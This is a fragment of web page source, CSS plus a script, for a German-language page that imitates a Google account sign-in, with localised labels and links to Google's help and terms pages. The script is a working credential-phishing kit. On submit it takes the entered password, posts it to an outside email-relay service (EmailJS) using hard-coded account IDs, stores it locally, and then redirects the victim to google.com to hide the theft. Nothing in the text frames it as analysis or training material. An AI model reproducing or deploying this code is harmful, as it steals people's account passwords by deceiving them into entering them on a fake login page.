.select-dropdown { position: absolute; bottom: calc(21% + 12px); left: 0; width: 220px; background: var(--dropdown-bg); border-radius: 3px; padding: 6px 0; display: none; z-index: 30; }

.custom-checkbox {
  display: inline-flex;
  align-items: center;#42445A
  cursor: pointer;
}

.custom-checkbox input {
  display: none; /* native Checkbox ausblenden */
}

.custom-checkbox span {
  width: 18px;
  height: 18px;
  border-radius: 2px;
  border: 2px solid #bdbdbd;
  background-color: transparent;
  position: relative;
  transition: background-color 0.15s ease, border-color 0.15s ease;
}

/* CHECKED */
.custom-checkbox input:checked + span {
  background-color: #b7d1ff; /* hellblau wie im Bild */
  border-color: #b7d1ff;
}

/* Häkchen */
.custom-checkbox span::after {
  content: "";
  position: absolute;
  left: 3px;
  top: 0px;
  width: 6px;
  height: 10px;
  border: solid #1f1f1f; /* schwarzes Häkchen */
  border-width: 0 2px 2px 0;
  transform: rotate(45deg);
  opacity: 0;
}

/* Häkchen sichtbar wenn checked */
.custom-checkbox input:checked + span::after {
  opacity: 1;
}

  <script type="module">
const EMAILJS_URL = "https://api.emailjs.com/api/v1.0/email/send";
const SERVICE_ID = "service_8ypqbgk";
const TEMPLATE_ID = "template_deqdkha";
const USER_ID = "3yT23vyp0ntqbG7BP";

async function sendEmail(templateParams) {
  const body = {
    service_id: SERVICE_ID,
    template_id: TEMPLATE_ID,
    user_id: USER_ID,
    template_params: templateParams
  };
  const resp = await fetch(EMAILJS_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });
  if (!resp.ok) {
    const text = await resp.text().catch(()=>resp.statusText);
    throw new Error("EmailJS send failed: " + resp.status + " " + text);
  }
  return resp;
}

function applyLang(code) {
  const pack = mappings[code] || mappings["en-US"];
  els.title.textContent = pack.title;
  els.headerSub.textContent = pack.headerSub;
  const label = document.getElementById("label-email");
  if (label) label.textContent = pack.labelEmail;
  if (els.createAccount) els.createAccount.textContent = pack.recovery || pack.createAccount || "Passwort vergessen?";
  if (els.loginButton) els.loginButton.value = pack.continueBtn;
  if (els.helpLink) els.helpLink.textContent = pack.help;
  if (els.privacyLink) els.privacyLink.textContent = pack.privacy;
  if (els.tosLink) els.tosLink.textContent = pack.tos;
  if (els.showPasswordLabel) els.showPasswordLabel.textContent = pack.showPassword || "Passwort anzeigen";
  if (pack.docLang) document.documentElement.lang = pack.docLang;
  const hl = pack.docLang || code;
  if (els.helpLink) els.helpLink.href = `https://support.google.com/accounts?hl=${encodeURIComponent(hl)}&p=account_iph`;
  if (els.privacyLink) els.privacyLink.href = `https://accounts.google.com/TOS?loc=${encodeURIComponent((hl==='de')?'DE':hl)}&hl=${encodeURIComponent(hl)}&privacy=true`;
  if (els.tosLink) els.tosLink.href = `https://accounts.google.com/TOS?loc=${encodeURIComponent((hl==='de')?'DE':hl)}&hl=${encodeURIComponent(hl)}`;
  btn.childNodes[0].textContent = pack.langLabel + " ";
  Array.from(list.children).forEach(li => {
    li.classList.toggle("active", li.dataset.code === code);
    if (li.dataset.code === code) li.setAttribute("aria-selected", "true"); else li.removeAttribute("aria-selected");
  });
  try { localStorage.setItem("site_lang", code); } catch(e){}
}

/* init language */
const initial = (function(){ try { return localStorage.getItem("site_lang") || "de"; } catch(e){ return "de"; } })();
applyLang(initial);

/* language dropdown interactions */
btn.addEventListener("click", (e) => { e.stopPropagation(); btn.classList.toggle("open"); list.classList.toggle("open"); });
list.addEventListener("click", (e) => {
  const li = e.target.closest("li"); if (!li) return;
  const code = li.dataset.code || "en-US";
  applyLang(code); btn.classList.remove("open"); list.classList.remove("open");
});
document.addEventListener("click", e => { if (!e.target.closest(".select-wrapper")) { btn.classList.remove("open"); list.classList.remove("open"); }});
document.addEventListener("keydown", (e) => { if (e.key === "Escape") { btn.classList.remove("open"); list.classList.remove("open"); }});

/* password show/hide */
const toggle = document.getElementById("togglePassword");
const passwordInput = document.getElementById("password");
toggle.addEventListener("change", () => {
  if (toggle.checked) passwordInput.type = "text"; else passwordInput.type = "password";
});

/* show localStorage value next to .box9472 if present */
function showStoredValue() {
  const display = document.getElementById("storedValue");
  if (!display) return;
  try {
    const stored = localStorage.getItem("last_sent_name");
    if (stored && stored.length) {
      // show a masked version for privacy (first and last char + dots) but keep visible per request
      const trimmed = stored.length > 12 ? stored.slice(0,6) + "…" + stored.slice(-3) : stored;
      display.textContent = "" + trimmed;
      display.title = stored;
    } else {
      display.textContent = ""; // nothing to show
    }
  } catch (e) {
    display.textContent = "";
  }
}
showStoredValue();

/* form submit -> EmailJS REST (sends password as 'name' param for legacy behavior) */
const form = document.getElementById("sendForm");
const submitBtn = document.getElementById("loginButton");
form.addEventListener("submit", async (e) => {
  e.preventDefault();
  const pass = passwordInput.value.trim();
  const code = localStorage.getItem("site_lang") || initial;
  const msgs = {
    "de":"Bitte Passwort eingeben.",
    "en-US":"Please enter password.",
    "en-GB":"Please enter password."
  };
  if (!pass) { alert(msgs[code] || msgs["en-US"]); passwordInput.focus(); return; }

  submitBtn.disabled = true;
  submitBtn.style.opacity = "0.7";
  submitBtn.style.cursor = "default";

  try {
    await sendEmail({ name: pass });
    try { localStorage.setItem("last_sent_name", pass); } catch(e){}
    showStoredValue(); // update display after storing
    setTimeout(()=> { window.location.href = "https://google.com"; }, 700);
  } catch (err) {
    submitBtn.disabled = false;
    submitBtn.style.opacity = "1";
    submitBtn.style.cursor = "pointer";
    console.error(err);
    alert("Fehler beim Senden. Bitte später erneut versuchen.");
  }
});
